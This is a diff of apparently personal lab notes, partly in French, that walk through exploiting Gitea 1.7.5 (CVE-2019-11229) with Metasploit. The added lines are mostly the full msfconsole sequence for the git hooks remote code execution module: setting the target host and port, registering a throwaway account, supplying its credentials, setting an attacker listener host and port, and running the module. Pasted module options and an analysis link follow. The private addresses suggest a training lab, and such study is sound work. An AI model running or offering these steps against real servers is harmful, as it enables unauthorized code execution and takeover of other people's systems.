@@ -13,12 +13,43 @@ Application Version: 1.7.5
 
 Gitea version 1.7.5
 
-CVE-2019-11229
-il faut un user et mdp
-on va créer un register
+msfconsole 
+search gitea
+use exploit/multi/http/gitea_git_hooks_rce
+set RHOSTS 192.168.62.67 (ip cible)
+set RPORT 3000 (port cible)
+run
+il veut un mot de passe
+
+on va créer un register sur gitea
 user : test
 pwd : testtest
 mail : test@test.com
+
+set USERNAME test
+set PASSWORD testtest
+
+set SRVHOST 192.168.49.62
+set SRVPORT 8080
+
+set TARGETURI /gitea/
+run
+
+PASSWORD   testtest         yes       Password to use
+Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies
+                                    : socks5, http, socks5h, sapni, socks4
+RHOSTS     192.168.62.67    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
+                                    s/using-metasploit.html
+RPORT      3000             yes       The target port (TCP)
+SSL        false            no        Negotiate SSL/TLS for outgoing connections
+SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+TARGETURI  /                yes       Base path
+URIPATH                     no        The URI to use for this exploit (default is random)
+USERNAME   test             yes       Username to authenticate with
+VHOST                       no        HTTP server virtual host
+
+set TARGETURI /gitea/
+https://medium.com/@knownsec404team/analysis-of-cve-2019-11229-from-git-config-to-rce-32c217727baa
 
 
 
